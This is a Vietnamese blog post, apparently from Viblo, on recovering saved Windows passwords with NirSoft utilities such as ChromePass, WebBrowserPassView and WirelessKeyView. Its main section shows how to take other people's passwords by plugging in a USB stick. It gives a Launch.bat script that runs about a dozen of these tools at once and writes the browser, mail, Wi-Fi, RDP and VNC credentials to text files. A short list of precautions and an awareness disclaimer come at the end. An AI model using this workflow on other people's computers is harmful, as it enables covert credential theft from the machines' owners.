Như tiêu đề nay mình sẽ giới thiệu cho các bạn cách để lấy toàn bộ mật khẩu lưu trên PC windows của bạn và cũng có thể dùng cách này để "hack" toàn bộ mật khẩu của người khác chỉ cần 1 USB và 30s thôi chứ chưa cần phải đến 5 phút. Nào, cùng bắt tay vào thử nghiệm và tìm biện pháp phòng chống thôi.
## Lấy toàn bộ tài khoản và mật khẩu lưu trên windows của mình
### Bước một: Cài đặt công cụ
Các bạn truy cập vào trang  [Nirsoft](http://www.nirsoft.net/utils/) để tải 1 số tiện ích. Tùy vào mục đích sử dụng thì bạn sẽ tải công cụ tương ứng. mình sẽ test lấy toàn bộ mật khẩu lưu trên googlechome nên mình sẽ tải [chromepass](http://www.nirsoft.net/utils/chromepass.html) (có thể dùng nhiều tiện ích cùng lúc để lấy mật khẩu trên nhiều ứng dụng hơn).<br>
![](https://images.viblo.asia/f2873457-2ba6-405d-961c-f326c1af41e3.png)
Một số tiện ích của [Nirsoft](http://www.nirsoft.net/utils/)
* MessenPass
* Mail PassView
* Protected Storage PassView
* Dialupass
* BulletsPassView
* Network Password Recovery
* SniffPass Password Sniffer
* RouterPassView
* PstPassword
* WebBrowserPassView
* WirelessKeyView
* Remote Desktop PassView
* VNCPassView

### Bước hai: Thực thi
Giải nén tệp vừa tải về và mở file ChromePass.exe . Toàn bộ tài khoản và mật khẩu lưu trên googlechome đã hiện ra ??? sao dễ vậy nhỉ :)
![](https://images.viblo.asia/03051637-acd7-4804-9f65-fc9e019ab750.png)
Và đây là kết quả
![](https://images.viblo.asia/d5b0bd90-a4a9-49c1-9c1c-04b1ff423688.png)
## Lấy toàn bộ tài khoản và mật khẩu lưu trên windows của người khác
### Bước một: cài đặt công cụ
Tải những tiện ích cần thiết trên trang [Nirsoft](http://www.nirsoft.net/utils/). Từ các file zip đã tải về copy các file thực thi (đuôi .exe) của từng tiện ích vào USB.
Mỗi tệp thực thi này sẽ phục hồi mật khẩu từ một vị trí cụ thể trên máy tính. Ví dụ: WirelessKeyView.exe lấy khóa không dây của bạn và WebBrowserPassView.exe lấy tất cả mật khẩu được lưu trong trình duyệt của bạn.
Nếu bạn thấy bất kỳ công cụ khôi phục mật khẩu nào khác mà bạn muốn dùng thử, hãy tải chúng xuống.
### Bước hai: Tự động hóa các công cụ để làm việc với một cú nhấp chuột (Chỉ dành cho XP và Vista)
* Tiếp theo thiết lập một tập lệnh chạy tất cả các tiện ích này cùng một lúc, cho phép bạn lấy số lượng mật khẩu khổng lồ được lưu trữ chỉ bằng một cú nhấp chuột (chỉ hoạt động đúng trên Windows XP và Vista, vì vậy nếu bạn sử dụng Windows 7 trở lên, bạn có thể bỏ qua bước này). Mở trình soạn thảo văn bản của bạn và đối với mỗi tệp bạn đã tải xuống, hãy viết dòng mã này trong một tệp văn bản:
`start filename /stext filename.txt`
* Thay thế "filename" bằng tên của tệp thực thi bạn vừa tải xuống. Khi bạn thay thế "filename" sau dấu gạch chéo, bạn sẽ thay đổi .exe thành phần mở rộng tệp .txt
filename.txt sẽ như thế này
```
start mspass.exe /stext mspass.txt
start mailpv.exe /stext mailpv.txt<br>start pspv.exe /stext pspv.txt
start Dialupass.exe /stext Dialupass.txt
start BulletsPassView.exe /stext BulletsPassView.txt
start netpass.exe /stext netpass.txt
start sniffpass.exe /stext sniffpass.txt
start RouterPassView.exe /stext RouterPassView.txt
start PstPassword.exe /stext PstPassword.txt
start WebBrowserPassView.exe /stext WebBrowserPassView.txt
start WirelessKeyView.exe /stext WirelessKeyView.txt
start rdpv.exe /stext rdpv.txt
start VNCPassView.exe /stext VNCPassView.txt
```
Lưu ý: Mỗi dòng này thực thi 1 tiện ích mà bạn cài đặt nên tùy vào tiện ích bạn cài đặt sẽ viết các dòng tương ứng.
* Khi bạn đã viết xong tập lệnh, hãy lưu tệp dưới dạng Launch.bat trong thư mục Tiện ích bạn đã tạo.
* Thực thi trên  XP và Vista: 

cắm USB của bạn vào máy tính cần lấy mật khẩu. Nhấp vào tệp launch.bat bạn vừa thực hiện để khởi chạy nó.  Mật khẩu sẽ xuất hiện dưới dạng tệp .txt cùng với các tệp thực thi gốc. Mỗi tệp sẽ có cùng tên với tệp .exe của chúng.
Ví dụ: tệp ChromePass.exe sẽ có tệp ChromePass.txt chứa tất cả mật khẩu và tên người dùng được khôi phục. Tất cả bạn phải làm là mở các tệp .txt và bạn sẽ thấy tất cả mật khẩu.
### Với Windows 7 trở lên
Chạy riêng lẻ từng file .exe mật khẩu sẽ hiện lên và copy vào file lưu trữ.
## Biện pháp phòng ngừa
Bây giờ bạn đã biết thông tin của bạn dễ bị đánh cắp như thế nào rồi, hãy nghiêm túc trong việc bảo vệ chính mình. Thực hiện các biện pháp phòng ngừa sau:

* Đặt mật khẩu máy tính, luôn khóa máy khi không sử dụng. 
* Thực hiện các biện pháp như không cho phép trình duyệt của bạn nhớ mật khẩu hoặc ít nhất là các mật khẩu quan trọng như ngân hàng.
* Sử dụng các trình quản lý mật khẩu có mã hóa như [LastPass](https://www.lastpass.com/) hoặc một trình quản lý mật khẩu tốt khác để lưu trữ tất cả mật khẩu của bạn một cách an toàn.
* Sử dụng xác thực hai yếu tố.
* Luôn duy trì kiểm soát máy tính của bạn
* Không bao giờ để PC của bạn không giám sát, đặc biệt là những người đang sử dụng ổ USB trên máy tính của bạn.
## Kết bàI
Bài viết với mục đích nhắc nhở, cảnh báo mọi người cảnh giác hơn trong việc đảm bảo an toàn thông tin của chính bản thân mình.<br>
Cảm ơn mọi người đã theo dõi.
bài tiếp theo mình sẽ viết về [10 hiểm họa hàng đầu với an toàn cơ sở dữ liệu](https://viblo.asia/p/10-hiem-hoa-hang-dau-voi-an-toan-co-so-du-lieu-ORNZq4GGK0n) mn cùng theo dõi nhé.